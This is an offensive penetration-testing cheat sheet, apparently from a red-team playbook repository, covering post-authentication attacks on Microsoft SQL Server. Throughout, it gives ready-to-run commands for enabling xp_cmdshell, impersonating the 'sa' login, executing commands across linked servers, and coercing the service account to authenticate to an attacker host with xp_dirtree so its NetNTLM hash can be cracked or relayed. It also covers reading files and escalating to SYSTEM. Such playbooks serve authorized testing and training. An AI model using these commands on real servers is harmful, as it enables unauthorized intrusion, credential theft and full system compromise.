# 06 — MSSQL Abuse

Post-auth MSSQL attack chain: command exec, privilege impersonation, linked-server lateral movement, service-account hash capture, and the jump to SYSTEM. Connection basics + discovery live in [Service Enumeration → MSSQL](../1-information-gathering/04-service-enumeration.md); this file is what to do **once you can run queries**.

**Jump to:** [Connect](#connect) · [xp_cmdshell (command exec)](#xp_cmdshell-command-exec) · [Login Impersonation (EXECUTE AS)](#login-impersonation-execute-as) · [Linked Servers (DB → DB lateral)](#linked-servers-db--db-lateral) · [Capture the SQL Service Account Hash](#capture-the-sql-service-account-hash) · [Read / Write Files](#read--write-files) · [SQL Service Account → SYSTEM](#sql-service-account--system) · [PowerUpSQL (on-host)](#powerupsql-on-host)

**Lane:** from Kali with creds → `impacket-mssqlclient`. On a domain-joined Windows host → `PowerUpSQL` ([below](#powerupsql-on-host)) or `sqlcmd`.

---

## Connect

```bash
## SQL auth
impacket-mssqlclient sa:'<pass>'@<ip>
## Windows / domain auth
impacket-mssqlclient <domain>/<user>:'<pass>'@<ip> -windows-auth
## Kerberos
impacket-mssqlclient -k <domain>/<user>@<host-fqdn>
```

Orient inside the prompt:

```sql
SELECT @@version;
SELECT SYSTEM_USER;                 -- who the server sees you as
SELECT IS_SRVROLEMEMBER('sysadmin'); -- 1 = you're SA already (skip to xp_cmdshell)
SELECT name FROM sys.databases;
```

## xp_cmdshell (command exec)

impacket helper does the config dance for you:

```sql
enable_xp_cmdshell
xp_cmdshell whoami
```

Manual T-SQL equivalent (any client):

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

Runs as the **SQL Server service account** — note who that is, it decides your next move.

## Login Impersonation (EXECUTE AS)

If your login can impersonate a higher one (common misconfig), become SA.

```sql
## Find who you can impersonate
SELECT distinct b.name FROM sys.server_permissions a
  INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';

## Impersonate
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');   -- confirm you're now SA
## (impacket helper: enum_impersonate)
```

Database-level variant: `EXECUTE AS USER = 'dbo';` after `USE <db>;`.

## Linked Servers (DB → DB lateral)

Linked servers let one SQL instance query another — often with **higher privs on the far side** (classic path to a DC-hosted SQL as SA → SYSTEM).

```sql
## Discover links
SELECT * FROM sys.servers;          -- or: EXEC sp_linkedservers;
enum_links                          -- impacket helper

## Query across a link
SELECT * FROM OPENQUERY("LINKED\SRV", 'SELECT @@version; SELECT SYSTEM_USER;');

## Run commands on the linked server (needs RPC Out enabled on the link)
EXEC ('sp_configure ''show advanced options'',1; reconfigure;') AT [LINKED\SRV];
EXEC ('sp_configure ''xp_cmdshell'',1; reconfigure;') AT [LINKED\SRV];
EXEC ('xp_cmdshell ''whoami''') AT [LINKED\SRV];

## Chain links (A → B → C) by nesting OPENQUERY
SELECT * FROM OPENQUERY("SRV1",
  'SELECT * FROM OPENQUERY("SRV2", ''SELECT @@version'')');
```

impacket shortcut: `use_link <name>` drops you onto the linked instance.

## Capture the SQL Service Account Hash

Force the SQL service account to authenticate to you, then crack/relay the NetNTLM. Start `responder -I tun0` (or `ntlmrelayx`) first.

```sql
EXEC master..xp_dirtree '\\<attacker-ip>\share';     -- most reliable
EXEC master..xp_subdirs '\\<attacker-ip>\share';
EXEC master..xp_fileexist '\\<attacker-ip>\share\x';
```

Crack with `hashcat -m 5600`, or relay if SMB signing is off (see [AD runbook → Responder/relay](../7-runbooks/03-active-directory.md)).

## Read / Write Files

```sql
## Read any file the service account can (needs ADMINISTER BULK OPERATIONS)
SELECT * FROM OPENROWSET(BULK N'C:\Windows\win.ini', SINGLE_CLOB) AS x;

## OLE Automation — alt to xp_cmdshell for write/exec
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
```

## SQL Service Account → SYSTEM

`xp_cmdshell` runs as the SQL service account, which almost always holds **SeImpersonate** → Potato → SYSTEM.

```sql
EXEC xp_cmdshell 'whoami /priv';     -- confirm SeImpersonatePrivilege = Enabled
```

Then run a Potato against it — full chain in [Windows Privesc → SeImpersonate / Potato](../4-post-exploitation/02-windows-privilege-escalation.md).

## PowerUpSQL (on-host)

From a domain-joined Windows foothold (no creds needed — uses your token):

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain                          # find instances via SPNs
Get-SQLConnectionTest -Instance <host>         # can you auth?
Invoke-SQLAudit -Instance <host>               # auto-find privesc
Get-SQLServerLinkCrawl -Instance <host>        # map + crawl linked servers
Invoke-SQLOSCmd -Instance <host> -Command "whoami" -RawResults
```

See also: [Service Enumeration → MSSQL](../1-information-gathering/04-service-enumeration.md) · [Windows Privesc](../4-post-exploitation/02-windows-privilege-escalation.md) · [AD runbook](../7-runbooks/03-active-directory.md).
